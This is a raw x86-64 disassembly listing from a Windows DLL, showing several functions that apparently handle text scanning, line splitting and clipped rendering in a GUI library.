   18000427e:	41 80 bd 30 2f 00 00 	cmpb   $0x0,0x2f30(%r13)
   180004285:	00 
   180004286:	0f 28 bc 24 80 00 00 	movaps 0x80(%rsp),%xmm7
   18000428d:	00 
   18000428e:	0f 84 40 01 00 00    	je     0x1800043d4
   180004294:	4d 8b be 18 1a 00 00 	mov    0x1a18(%r14),%r15
   18000429b:	48 85 db             	test   %rbx,%rbx
   18000429e:	75 2d                	jne    0x1800042cd
   1800042a0:	48 8b dd             	mov    %rbp,%rbx
   1800042a3:	48 83 fd ff          	cmp    $0xffffffffffffffff,%rbp
   1800042a7:	73 24                	jae    0x1800042cd
   1800042a9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1800042b0:	0f b6 0b             	movzbl (%rbx),%ecx
   1800042b3:	84 c9                	test   %cl,%cl
   1800042b5:	74 16                	je     0x1800042cd
   1800042b7:	48 8d 43 01          	lea    0x1(%rbx),%rax
   1800042bb:	80 f9 23             	cmp    $0x23,%cl
   1800042be:	75 04                	jne    0x1800042c4
   1800042c0:	38 08                	cmp    %cl,(%rax)
   1800042c2:	74 09                	je     0x1800042cd
   1800042c4:	48 8b d8             	mov    %rax,%rbx
   1800042c7:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1800042cb:	72 e3                	jb     0x1800042b0
   1800042cd:	f3 41 0f 10 86 50 2f 	movss  0x2f50(%r14),%xmm0
   1800042d4:	00 00 
   1800042d6:	f3 0f 10 4c 24 54    	movss  0x54(%rsp),%xmm1
   1800042dc:	f3 0f 58 05 20 78 04 	addss  0x47820(%rip),%xmm0        # 0x18004bb04
   1800042e3:	00 
   1800042e4:	f3 41 0f 11 8e 50 2f 	movss  %xmm1,0x2f50(%r14)
   1800042eb:	00 00 
   1800042ed:	0f 2f c8             	comiss %xmm0,%xmm1
   1800042f0:	76 0c                	jbe    0x1800042fe
   1800042f2:	41 b4 01             	mov    $0x1,%r12b
   1800042f5:	45 88 a6 54 2f 00 00 	mov    %r12b,0x2f54(%r14)
   1800042fc:	eb 03                	jmp    0x180004301
   1800042fe:	45 32 e4             	xor    %r12b,%r12b
   180004301:	41 8b 87 08 01 00 00 	mov    0x108(%r15),%eax
   180004308:	48 8b fd             	mov    %rbp,%rdi
   18000430b:	41 8b 8e 58 2f 00 00 	mov    0x2f58(%r14),%ecx
   180004312:	3b c8                	cmp    %eax,%ecx
   180004314:	7e 09                	jle    0x18000431f
   180004316:	41 89 86 58 2f 00 00 	mov    %eax,0x2f58(%r14)
   18000431d:	8b c8                	mov    %eax,%ecx
   18000431f:	45 8b bf 08 01 00 00 	mov    0x108(%r15),%r15d
   180004326:	44 2b f9             	sub    %ecx,%r15d
   180004329:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180004330:	4c 8b c3             	mov    %rbx,%r8
   180004333:	ba 0a 00 00 00       	mov    $0xa,%edx
   180004338:	4c 2b c7             	sub    %rdi,%r8
   18000433b:	48 8b cf             	mov    %rdi,%rcx
   18000433e:	e8 fb b9 03 00       	call   0x18003fd3e
   180004343:	48 85 c0             	test   %rax,%rax
   180004346:	48 8b f3             	mov    %rbx,%rsi
   180004349:	48 0f 45 f0          	cmovne %rax,%rsi
   18000434d:	48 3b f3             	cmp    %rbx,%rsi
   180004350:	75 05                	jne    0x180004357
   180004352:	48 3b fe             	cmp    %rsi,%rdi
   180004355:	74 6c                	je     0x1800043c3
   180004357:	44 8b ce             	mov    %esi,%r9d
   18000435a:	44 2b cf             	sub    %edi,%r9d
   18000435d:	45 84 e4             	test   %r12b,%r12b
   180004360:	75 2b                	jne    0x18000438d
   180004362:	48 3b fd             	cmp    %rbp,%rdi
   180004365:	75 26                	jne    0x18000438d
   180004367:	45 38 a6 54 2f 00 00 	cmp    %r12b,0x2f54(%r14)
   18000436e:	74 09                	je     0x180004379
   180004370:	48 8d 0d 91 fe 03 00 	lea    0x3fe91(%rip),%rcx        # 0x180044208
   180004377:	eb 1b                	jmp    0x180004394
   180004379:	4c 8b c7             	mov    %rdi,%r8
   18000437c:	48 8d 0d 8d fe 03 00 	lea    0x3fe8d(%rip),%rcx        # 0x180044210
   180004383:	41 8b d1             	mov    %r9d,%edx
   180004386:	e8 b5 15 01 00       	call   0x180015940
   18000438b:	eb 20                	jmp    0x1800043ad
   18000438d:	48 8d 0d 64 fe 03 00 	lea    0x3fe64(%rip),%rcx        # 0x1800441f8
   180004394:	4c 8d 05 f7 d5 03 00 	lea    0x3d5f7(%rip),%r8        # 0x180041992
   18000439b:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1800043a0:	42 8d 14 bd 00 00 00 	lea    0x0(,%r15,4),%edx
   1800043a7:	00 
   1800043a8:	e8 93 15 01 00       	call   0x180015940
   1800043ad:	41 c6 86 54 2f 00 00 	movb   $0x0,0x2f54(%r14)
   1800043b4:	00 
   1800043b5:	48 3b f3             	cmp    %rbx,%rsi
   1800043b8:	74 1a                	je     0x1800043d4
   1800043ba:	48 8d 7e 01          	lea    0x1(%rsi),%rdi
   1800043be:	e9 6d ff ff ff       	jmp    0x180004330
   1800043c3:	45 84 e4             	test   %r12b,%r12b
   1800043c6:	74 0c                	je     0x1800043d4
   1800043c8:	48 8d 0d 49 fe 03 00 	lea    0x3fe49(%rip),%rcx        # 0x180044218
   1800043cf:	e8 6c 15 01 00       	call   0x180015940
   1800043d4:	4c 8b a4 24 e0 00 00 	mov    0xe0(%rsp),%r12
   1800043db:	00 
   1800043dc:	48 8b b4 24 d8 00 00 	mov    0xd8(%rsp),%rsi
   1800043e3:	00 
   1800043e4:	4c 8b bc 24 e8 00 00 	mov    0xe8(%rsp),%r15
   1800043eb:	00 
   1800043ec:	44 0f 28 4c 24 70    	movaps 0x70(%rsp),%xmm9
   1800043f2:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   1800043f9:	41 5e                	pop    %r14
   1800043fb:	41 5d                	pop    %r13
   1800043fd:	5f                   	pop    %rdi
   1800043fe:	5d                   	pop    %rbp
   1800043ff:	5b                   	pop    %rbx
   180004400:	c3                   	ret
   180004401:	cc                   	int3
   180004402:	cc                   	int3
   180004403:	cc                   	int3
   180004404:	cc                   	int3
   180004405:	cc                   	int3
   180004406:	cc                   	int3
   180004407:	cc                   	int3
   180004408:	cc                   	int3
   180004409:	cc                   	int3
   18000440a:	cc                   	int3
   18000440b:	cc                   	int3
   18000440c:	cc                   	int3
   18000440d:	cc                   	int3
   18000440e:	cc                   	int3
   18000440f:	cc                   	int3
   180004410:	40 53                	rex push %rbx
   180004412:	55                   	push   %rbp
   180004413:	57                   	push   %rdi
   180004414:	41 56                	push   %r14
   180004416:	41 57                	push   %r15
   180004418:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   18000441f:	4c 8b 35 aa 89 07 00 	mov    0x789aa(%rip),%r14        # 0x18007cdd0
   180004426:	49 8b d8             	mov    %r8,%rbx
   180004429:	0f 29 bc 24 80 00 00 	movaps %xmm7,0x80(%rsp)
   180004430:	00 
   180004431:	66 48 0f 6e f9       	movq   %rcx,%xmm7
   180004436:	44 0f 29 4c 24 70    	movaps %xmm9,0x70(%rsp)
   18000443c:	44 0f 28 cb          	movaps %xmm3,%xmm9
   180004440:	f2 0f 11 7c 24 50    	movsd  %xmm7,0x50(%rsp)
   180004446:	48 8b ea             	mov    %rdx,%rbp
   180004449:	49 8b be 18 1a 00 00 	mov    0x1a18(%r14),%rdi
   180004450:	4d 8b fe             	mov    %r14,%r15
   180004453:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   18000445a:	48 85 db             	test   %rbx,%rbx
   18000445d:	75 12                	jne    0x180004471
   18000445f:	49 8b c0             	mov    %r8,%rax
   180004462:	80 7c 10 01 00       	cmpb   $0x0,0x1(%rax,%rdx,1)
   180004467:	48 8d 40 01          	lea    0x1(%rax),%rax
   18000446b:	75 f5                	jne    0x180004462
   18000446d:	48 8d 1c 10          	lea    (%rax,%rdx,1),%rbx
   180004471:	48 3b eb             	cmp    %rbx,%rbp
   180004474:	0f 84 ca 02 00 00    	je     0x180004744
   18000447a:	f3 0f 10 0d 82 76 04 	movss  0x47682(%rip),%xmm1        # 0x18004bb04
   180004481:	00 
   180004482:	33 c9                	xor    %ecx,%ecx
   180004484:	48 8b bf a8 02 00 00 	mov    0x2a8(%rdi),%rdi
   18000448b:	48 89 b4 24 d8 00 00 	mov    %rsi,0xd8(%rsp)
   180004492:	00 
   180004493:	4c 89 a4 24 e0 00 00 	mov    %r12,0xe0(%rsp)
   18000449a:	00 
   18000449b:	4c 89 ac 24 e8 00 00 	mov    %r13,0xe8(%rsp)
   1800044a2:	00 
   1800044a3:	0f 29 b4 24 90 00 00 	movaps %xmm6,0x90(%rsp)
   1800044aa:	00 
   1800044ab:	e8 90 f7 ff ff       	call   0x180003c40
   1800044b0:	f3 41 0f 10 b6 10 19 	movss  0x1910(%r14),%xmm6
   1800044b7:	00 00 
   1800044b9:	44 8b e8             	mov    %eax,%r13d
   1800044bc:	49 8b b6 08 19 00 00 	mov    0x1908(%r14),%rsi
   1800044c3:	4c 8b e3             	mov    %rbx,%r12
   1800044c6:	a9 00 00 00 ff       	test   $0xff000000,%eax
   1800044cb:	0f 84 0e 01 00 00    	je     0x1800045df
   1800044d1:	48 85 db             	test   %rbx,%rbx
   1800044d4:	75 23                	jne    0x1800044f9
   1800044d6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1800044dd:	00 00 00 
   1800044e0:	41 80 7c 28 01 00    	cmpb   $0x0,0x1(%r8,%rbp,1)
   1800044e6:	4d 8d 40 01          	lea    0x1(%r8),%r8
   1800044ea:	75 f4                	jne    0x1800044e0
   1800044ec:	4d 8d 24 28          	lea    (%r8,%rbp,1),%r12
   1800044f0:	49 3b ec             	cmp    %r12,%rbp
   1800044f3:	0f 84 e6 00 00 00    	je     0x1800045df
   1800044f9:	48 85 f6             	test   %rsi,%rsi
   1800044fc:	75 08                	jne    0x180004506
   1800044fe:	48 8b 47 38          	mov    0x38(%rdi),%rax
   180004502:	48 8b 70 08          	mov    0x8(%rax),%rsi
   180004506:	0f 57 c0             	xorps  %xmm0,%xmm0
   180004509:	0f 2e f0             	ucomiss %xmm0,%xmm6
   18000450c:	7a 0b                	jp     0x180004519
   18000450e:	75 09                	jne    0x180004519
   180004510:	48 8b 47 38          	mov    0x38(%rdi),%rax
   180004514:	f3 0f 10 70 10       	movss  0x10(%rax),%xmm6
   180004519:	83 7f 70 00          	cmpl   $0x0,0x70(%rdi)
   18000451d:	7f 1a                	jg     0x180004539
   18000451f:	41 b8 02 05 00 00    	mov    $0x502,%r8d
   180004525:	48 8d 15 24 d2 03 00 	lea    0x3d224(%rip),%rdx        # 0x180041750
   18000452c:	48 8d 0d 3d fe 03 00 	lea    0x3fe3d(%rip),%rcx        # 0x180044370
   180004533:	ff 15 57 cf 03 00    	call   *0x3cf57(%rip)        # 0x180041490
   180004539:	48 63 57 70          	movslq 0x70(%rdi),%rdx
   18000453d:	48 8b 47 78          	mov    0x78(%rdi),%rax
   180004541:	48 8b 4e 48          	mov    0x48(%rsi),%rcx
   180004545:	48 8b 44 d0 f8       	mov    -0x8(%rax,%rdx,8),%rax
   18000454a:	48 39 41 08          	cmp    %rax,0x8(%rcx)
   18000454e:	74 1a                	je     0x18000456a
   180004550:	41 b8 85 04 00 00    	mov    $0x485,%r8d
   180004556:	48 8d 15 53 46 04 00 	lea    0x44653(%rip),%rdx        # 0x180048bb0
   18000455d:	48 8d 0d ec 47 04 00 	lea    0x447ec(%rip),%rcx        # 0x180048d50
   180004564:	ff 15 26 cf 03 00    	call   *0x3cf26(%rip)        # 0x180041490
   18000456a:	83 7f 60 00          	cmpl   $0x0,0x60(%rdi)
   18000456e:	7f 1a                	jg     0x18000458a
   180004570:	41 b8 02 05 00 00    	mov    $0x502,%r8d
   180004576:	48 8d 15 d3 d1 03 00 	lea    0x3d1d3(%rip),%rdx        # 0x180041750
   18000457d:	48 8d 0d ec fd 03 00 	lea    0x3fdec(%rip),%rcx        # 0x180044370
   180004584:	ff 15 06 cf 03 00    	call   *0x3cf06(%rip)        # 0x180041490
   18000458a:	48 8b 47 68          	mov    0x68(%rdi),%rax
   18000458e:	66 49 0f 7e f9       	movq   %xmm7,%r9
   180004593:	4c 63 47 60          	movslq 0x60(%rdi),%r8
   180004597:	0f 28 d6             	movaps %xmm6,%xmm2
   18000459a:	c6 44 24 48 00       	movb   $0x0,0x48(%rsp)
   18000459f:	4d 03 c0             	add    %r8,%r8
   1800045a2:	f3 44 0f 11 4c 24 40 	movss  %xmm9,0x40(%rsp)
   1800045a9:	48 8b d7             	mov    %rdi,%rdx
   1800045ac:	4c 89 64 24 38       	mov    %r12,0x38(%rsp)
   1800045b1:	48 8b ce             	mov    %rsi,%rcx
   1800045b4:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   1800045b9:	42 0f 10 44 c0 f0    	movups -0x10(%rax,%r8,8),%xmm0
   1800045bf:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   1800045c4:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1800045c9:	0f 11 44 24 58       	movups %xmm0,0x58(%rsp)
   1800045ce:	44 89 6c 24 20       	mov    %r13d,0x20(%rsp)
   1800045d3:	e8 48 2a 02 00       	call   0x180027020
   1800045d8:	4c 8b 35 f1 87 07 00 	mov    0x787f1(%rip),%r14        # 0x18007cdd0
   1800045df:	41 80 bf 30 2f 00 00 	cmpb   $0x0,0x2f30(%r15)
   1800045e6:	00 
   1800045e7:	0f 28 b4 24 90 00 00 	movaps 0x90(%rsp),%xmm6
   1800045ee:	00 
   1800045ef:	4c 8b ac 24 e8 00 00 	mov    0xe8(%rsp),%r13
   1800045f6:	00 
   1800045f7:	0f 84 37 01 00 00    	je     0x180004734
   1800045fd:	4d 8b be 18 1a 00 00 	mov    0x1a18(%r14),%r15
   180004604:	48 85 db             	test   %rbx,%rbx
   180004607:	75 26                	jne    0x18000462f
   180004609:	48 8b dd             	mov    %rbp,%rbx
   18000460c:	48 83 fd ff          	cmp    $0xffffffffffffffff,%rbp
   180004610:	73 1d                	jae    0x18000462f
   180004612:	0f b6 0b             	movzbl (%rbx),%ecx
   180004615:	84 c9                	test   %cl,%cl
   180004617:	74 16                	je     0x18000462f
   180004619:	48 8d 43 01          	lea    0x1(%rbx),%rax
   18000461d:	80 f9 23             	cmp    $0x23,%cl
   180004620:	75 04                	jne    0x180004626
   180004622:	38 08                	cmp    %cl,(%rax)
   180004624:	74 09                	je     0x18000462f
   180004626:	48 8b d8             	mov    %rax,%rbx
   180004629:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   18000462d:	72 e3                	jb     0x180004612
   18000462f:	f3 41 0f 10 86 50 2f 	movss  0x2f50(%r14),%xmm0
   180004636:	00 00 
   180004638:	f3 0f 10 4c 24 54    	movss  0x54(%rsp),%xmm1
   18000463e:	f3 0f 58 05 be 74 04 	addss  0x474be(%rip),%xmm0        # 0x18004bb04
   180004645:	00 
   180004646:	f3 41 0f 11 8e 50 2f 	movss  %xmm1,0x2f50(%r14)
   18000464d:	00 00 
   18000464f:	0f 2f c8             	comiss %xmm0,%xmm1
   180004652:	76 0c                	jbe    0x180004660
   180004654:	41 b4 01             	mov    $0x1,%r12b
   180004657:	45 88 a6 54 2f 00 00 	mov    %r12b,0x2f54(%r14)
   18000465e:	eb 03                	jmp    0x180004663
   180004660:	45 32 e4             	xor    %r12b,%r12b
   180004663:	41 8b 87 08 01 00 00 	mov    0x108(%r15),%eax
   18000466a:	48 8b fd             	mov    %rbp,%rdi
   18000466d:	41 8b 8e 58 2f 00 00 	mov    0x2f58(%r14),%ecx
   180004674:	3b c8                	cmp    %eax,%ecx
   180004676:	7e 09                	jle    0x180004681
   180004678:	41 89 86 58 2f 00 00 	mov    %eax,0x2f58(%r14)
   18000467f:	8b c8                	mov    %eax,%ecx
   180004681:	45 8b bf 08 01 00 00 	mov    0x108(%r15),%r15d
   180004688:	44 2b f9             	sub    %ecx,%r15d
   18000468b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004690:	4c 8b c3             	mov    %rbx,%r8
   180004693:	ba 0a 00 00 00       	mov    $0xa,%edx
   180004698:	4c 2b c7             	sub    %rdi,%r8
   18000469b:	48 8b cf             	mov    %rdi,%rcx
   18000469e:	e8 9b b6 03 00       	call   0x18003fd3e
   1800046a3:	48 85 c0             	test   %rax,%rax
   1800046a6:	48 8b f3             	mov    %rbx,%rsi
   1800046a9:	48 0f 45 f0          	cmovne %rax,%rsi
   1800046ad:	48 3b f3             	cmp    %rbx,%rsi
   1800046b0:	75 05                	jne    0x1800046b7
   1800046b2:	48 3b fe             	cmp    %rsi,%rdi
   1800046b5:	74 6c                	je     0x180004723
   1800046b7:	44 8b ce             	mov    %esi,%r9d
   1800046ba:	44 2b cf             	sub    %edi,%r9d
   1800046bd:	45 84 e4             	test   %r12b,%r12b
   1800046c0:	75 2b                	jne    0x1800046ed
   1800046c2:	48 3b fd             	cmp    %rbp,%rdi
   1800046c5:	75 26                	jne    0x1800046ed
   1800046c7:	45 38 a6 54 2f 00 00 	cmp    %r12b,0x2f54(%r14)
   1800046ce:	74 09                	je     0x1800046d9
   1800046d0:	48 8d 0d 31 fb 03 00 	lea    0x3fb31(%rip),%rcx        # 0x180044208
   1800046d7:	eb 1b                	jmp    0x1800046f4
   1800046d9:	4c 8b c7             	mov    %rdi,%r8
   1800046dc:	48 8d 0d 2d fb 03 00 	lea    0x3fb2d(%rip),%rcx        # 0x180044210
   1800046e3:	41 8b d1             	mov    %r9d,%edx
   1800046e6:	e8 55 12 01 00       	call   0x180015940
   1800046eb:	eb 20                	jmp    0x18000470d
   1800046ed:	48 8d 0d 04 fb 03 00 	lea    0x3fb04(%rip),%rcx        # 0x1800441f8
   1800046f4:	4c 8d 05 97 d2 03 00 	lea    0x3d297(%rip),%r8        # 0x180041992
   1800046fb:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180004700:	42 8d 14 bd 00 00 00 	lea    0x0(,%r15,4),%edx
   180004707:	00 
   180004708:	e8 33 12 01 00       	call   0x180015940
   18000470d:	41 c6 86 54 2f 00 00 	movb   $0x0,0x2f54(%r14)
   180004714:	00 
   180004715:	48 3b f3             	cmp    %rbx,%rsi
   180004718:	74 1a                	je     0x180004734
   18000471a:	48 8d 7e 01          	lea    0x1(%rsi),%rdi
   18000471e:	e9 6d ff ff ff       	jmp    0x180004690
   180004723:	45 84 e4             	test   %r12b,%r12b
   180004726:	74 0c                	je     0x180004734
   180004728:	48 8d 0d e9 fa 03 00 	lea    0x3fae9(%rip),%rcx        # 0x180044218
   18000472f:	e8 0c 12 01 00       	call   0x180015940
   180004734:	48 8b b4 24 d8 00 00 	mov    0xd8(%rsp),%rsi
   18000473b:	00 
   18000473c:	4c 8b a4 24 e0 00 00 	mov    0xe0(%rsp),%r12
   180004743:	00 
   180004744:	0f 28 bc 24 80 00 00 	movaps 0x80(%rsp),%xmm7
   18000474b:	00 
   18000474c:	44 0f 28 4c 24 70    	movaps 0x70(%rsp),%xmm9
   180004752:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   180004759:	41 5f                	pop    %r15
   18000475b:	41 5e                	pop    %r14
   18000475d:	5f                   	pop    %rdi
   18000475e:	5d                   	pop    %rbp
   18000475f:	5b                   	pop    %rbx
   180004760:	c3                   	ret
   180004761:	cc                   	int3
   180004762:	cc                   	int3
   180004763:	cc                   	int3
   180004764:	cc                   	int3
   180004765:	cc                   	int3
   180004766:	cc                   	int3
   180004767:	cc                   	int3
   180004768:	cc                   	int3
   180004769:	cc                   	int3
   18000476a:	cc                   	int3
   18000476b:	cc                   	int3
   18000476c:	cc                   	int3
   18000476d:	cc                   	int3
   18000476e:	cc                   	int3
   18000476f:	cc                   	int3
   180004770:	48 8b c4             	mov    %rsp,%rax
   180004773:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180004777:	48 89 68 18          	mov    %rbp,0x18(%rax)
   18000477b:	56                   	push   %rsi
   18000477c:	57                   	push   %rdi
   18000477d:	41 56                	push   %r14
   18000477f:	48 81 ec e0 00 00 00 	sub    $0xe0,%rsp
   180004786:	48 8b b4 24 20 01 00 	mov    0x120(%rsp),%rsi
   18000478d:	00 
   18000478e:	49 8b d9             	mov    %r9,%rbx
   180004791:	0f 29 78 c8          	movaps %xmm7,-0x38(%rax)
   180004795:	4d 8b f0             	mov    %r8,%r14
   180004798:	f2 0f 10 3a          	movsd  (%rdx),%xmm7
   18000479c:	48 8b ea             	mov    %rdx,%rbp
   18000479f:	44 0f 29 40 b8       	movaps %xmm8,-0x48(%rax)
   1800047a4:	48 8b f9             	mov    %rcx,%rdi
   1800047a7:	48 8b 84 24 28 01 00 	mov    0x128(%rsp),%rax
   1800047ae:	00 
   1800047af:	45 0f 57 c0          	xorps  %xmm8,%xmm8
   1800047b3:	f2 0f 11 bc 24 08 01 	movsd  %xmm7,0x108(%rsp)
   1800047ba:	00 00 
   1800047bc:	48 85 c0             	test   %rax,%rax
   1800047bf:	74 14                	je     0x1800047d5
   1800047c1:	f2 0f 10 00          	movsd  (%rax),%xmm0
   1800047c5:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   1800047ca:	f2 0f 11 44 24 58    	movsd  %xmm0,0x58(%rsp)
   1800047d0:	e9 90 00 00 00       	jmp    0x180004865
   1800047d5:	48 8b 0d f4 85 07 00 	mov    0x785f4(%rip),%rcx        # 0x18007cdd0
   1800047dc:	f3 0f 10 91 10 19 00 	movss  0x1910(%rcx),%xmm2
   1800047e3:	00 
   1800047e4:	48 3b de             	cmp    %rsi,%rbx
   1800047e7:	75 10                	jne    0x1800047f9
   1800047e9:	f3 0f 11 54 24 54    	movss  %xmm2,0x54(%rsp)
   1800047ef:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%rsp)
   1800047f6:	00 
   1800047f7:	eb 67                	jmp    0x180004860
   1800047f9:	f3 0f 10 1d c3 73 04 	movss  0x473c3(%rip),%xmm3        # 0x18004bbc4
   180004800:	00 
   180004801:	48 8d 94 24 28 01 00 	lea    0x128(%rsp),%rdx
   180004808:	00 
   180004809:	48 8b 89 08 19 00 00 	mov    0x1908(%rcx),%rcx
   180004810:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   180004817:	00 00 
   180004819:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   18000481e:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   180004823:	f3 44 0f 11 44 24 20 	movss  %xmm8,0x20(%rsp)
   18000482a:	e8 d1 23 02 00       	call   0x180026c00
   18000482f:	f3 0f 10 84 24 28 01 	movss  0x128(%rsp),%xmm0
   180004836:	00 00 
   180004838:	f3 0f 58 05 c0 72 04 	addss  0x472c0(%rip),%xmm0        # 0x18004bb00
   18000483f:	00 
   180004840:	f3 0f 10 8c 24 2c 01 	movss  0x12c(%rsp),%xmm1
   180004847:	00 00 
   180004849:	f3 0f 11 4c 24 54    	movss  %xmm1,0x54(%rsp)
   18000484f:	f3 0f 2c c0          	cvttss2si %xmm0,%eax
   180004853:	66 0f 6e c0          	movd   %eax,%xmm0
   180004857:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
   18000485a:	f3 0f 11 44 24 50    	movss  %xmm0,0x50(%rsp)
   180004860:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   180004865:	f3 0f 10 20          	movss  (%rax),%xmm4
   180004869:	f3 0f 10 68 04       	movss  0x4(%rax),%xmm5
   18000486e:	48 8b 84 24 38 01 00 	mov    0x138(%rsp),%rax
   180004875:	00 
   180004876:	48 85 c0             	test   %rax,%rax
   180004879:	48 8b c8             	mov    %rax,%rcx
   18000487c:	48 0f 44 cd          	cmove  %rbp,%rcx
   180004880:	48 8d 50 08          	lea    0x8(%rax),%rdx
   180004884:	75 03                	jne    0x180004889
   180004886:	49 8b d6             	mov    %r14,%rdx
   180004889:	f3 0f 10 94 24 08 01 	movss  0x108(%rsp),%xmm2
   180004890:	00 00 
   180004892:	0f 28 c4             	movaps %xmm4,%xmm0
   180004895:	f3 0f 10 8c 24 0c 01 	movss  0x10c(%rsp),%xmm1
   18000489c:	00 00 
   18000489e:	f3 0f 58 c2          	addss  %xmm2,%xmm0
   1800048a2:	0f 2f 02             	comiss (%rdx),%xmm0
   1800048a5:	73 12                	jae    0x1800048b9
   1800048a7:	0f 28 c5             	movaps %xmm5,%xmm0
   1800048aa:	f3 0f 58 c1          	addss  %xmm1,%xmm0
   1800048ae:	0f 2f 42 04          	comiss 0x4(%rdx),%xmm0
   1800048b2:	73 05                	jae    0x1800048b9
   1800048b4:	45 32 c0             	xor    %r8b,%r8b
   1800048b7:	eb 03                	jmp    0x1800048bc
   1800048b9:	41 b0 01             	mov    $0x1,%r8b
   1800048bc:	48 85 c0             	test   %rax,%rax
   1800048bf:	74 1c                	je     0x1800048dd
   1800048c1:	f3 0f 10 01          	movss  (%rcx),%xmm0
   1800048c5:	0f 2f c2             	comiss %xmm2,%xmm0
   1800048c8:	77 0e                	ja     0x1800048d8
   1800048ca:	f3 0f 10 41 04       	movss  0x4(%rcx),%xmm0
   1800048cf:	0f 2f c1             	comiss %xmm1,%xmm0
   1800048d2:	77 04                	ja     0x1800048d8
   1800048d4:	32 c0                	xor    %al,%al
   1800048d6:	eb 02                	jmp    0x1800048da
   1800048d8:	b0 01                	mov    $0x1,%al
   1800048da:	44 0a c0             	or     %al,%r8b
   1800048dd:	48 8b 84 24 30 01 00 	mov    0x130(%rsp),%rax
   1800048e4:	00 
   1800048e5:	f3 0f 10 18          	movss  (%rax),%xmm3
   1800048e9:	41 0f 2f d8          	comiss %xmm8,%xmm3
   1800048ed:	76 2b                	jbe    0x18000491a
   1800048ef:	f3 41 0f 10 06       	movss  (%r14),%xmm0
   1800048f4:	f3 0f 5c c2          	subss  %xmm2,%xmm0
   1800048f8:	f3 0f 5c c4          	subss  %xmm4,%xmm0
   1800048fc:	f3 0f 59 c3          	mulss  %xmm3,%xmm0
   180004900:	f3 0f 58 c2          	addss  %xmm2,%xmm0
   180004904:	f3 0f 5f d0          	maxss  %xmm0,%xmm2
   180004908:	0f 28 c2             	movaps %xmm2,%xmm0
   18000490b:	0f 14 c1             	unpcklps %xmm1,%xmm0
   18000490e:	0f 28 f8             	movaps %xmm0,%xmm7
   180004911:	f2 0f 11 84 24 08 01 	movsd  %xmm0,0x108(%rsp)
   180004918:	00 00 
   18000491a:	f3 0f 10 50 04       	movss  0x4(%rax),%xmm2
   18000491f:	41 0f 2f d0          	comiss %xmm8,%xmm2
   180004923:	76 32                	jbe    0x180004957
   180004925:	f3 41 0f 10 46 04    	movss  0x4(%r14),%xmm0
   18000492b:	f3 0f 5c c1          	subss  %xmm1,%xmm0
   18000492f:	f3 0f 5c c5          	subss  %xmm5,%xmm0
   180004933:	f3 0f 59 c2          	mulss  %xmm2,%xmm0
   180004937:	f3 0f 58 c1          	addss  %xmm1,%xmm0
   18000493b:	f3 0f 5f c8          	maxss  %xmm0,%xmm1
   18000493f:	f2 0f 10 84 24 08 01 	movsd  0x108(%rsp),%xmm0
   180004946:	00 00 
   180004948:	0f c6 c0 e1          	shufps $0xe1,%xmm0,%xmm0
   18000494c:	f3 0f 10 c1          	movss  %xmm1,%xmm0
   180004950:	0f c6 c0 e1          	shufps $0xe1,%xmm0,%xmm0
   180004954:	0f 28 f8             	movaps %xmm0,%xmm7
   180004957:	f3 0f 10 0d a5 71 04 	movss  0x471a5(%rip),%xmm1        # 0x18004bb04
   18000495e:	00 
   18000495f:	0f 29 b4 24 d0 00 00 	movaps %xmm6,0xd0(%rsp)
   180004966:	00 
   180004967:	45 84 c0             	test   %r8b,%r8b
   18000496a:	0f 84 cc 01 00 00    	je     0x180004b3c
   180004970:	44 0f 29 8c 24 a0 00 	movaps %xmm9,0xa0(%rsp)
   180004977:	00 00 
   180004979:	f3 44 0f 10 09       	movss  (%rcx),%xmm9
   18000497e:	44 0f 29 94 24 90 00 	movaps %xmm10,0x90(%rsp)
   180004985:	00 00 
   180004987:	f3 44 0f 10 51 04    	movss  0x4(%rcx),%xmm10
   18000498d:	33 c9                	xor    %ecx,%ecx
   18000498f:	44 0f 29 9c 24 80 00 	movaps %xmm11,0x80(%rsp)
   180004996:	00 00 
   180004998:	f3 44 0f 10 1a       	movss  (%rdx),%xmm11
   18000499d:	44 0f 29 64 24 70    	movaps %xmm12,0x70(%rsp)
   1800049a3:	f3 44 0f 10 62 04    	movss  0x4(%rdx),%xmm12
   1800049a9:	e8 92 f2 ff ff       	call   0x180003c40
   1800049ae:	44 8b f0             	mov    %eax,%r14d
   1800049b1:	a9 00 00 00 ff       	test   $0xff000000,%eax
   1800049b6:	0f 84 35 01 00 00    	je     0x180004af1
   1800049bc:	48 85 f6             	test   %rsi,%rsi
   1800049bf:	75 1e                	jne    0x1800049df
   1800049c1:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   1800049c8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1800049cf:	00 
   1800049d0:	80 7c 0b 01 00       	cmpb   $0x0,0x1(%rbx,%rcx,1)
   1800049d5:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   1800049d9:	75 f5                	jne    0x1800049d0
   1800049db:	48 8d 34 19          	lea    (%rcx,%rbx,1),%rsi
   1800049df:	48 3b de             	cmp    %rsi,%rbx
   1800049e2:	0f 84 09 01 00 00    	je     0x180004af1
   1800049e8:	83 7f 70 00          	cmpl   $0x0,0x70(%rdi)
   1800049ec:	48 8b 47 38          	mov    0x38(%rdi),%rax
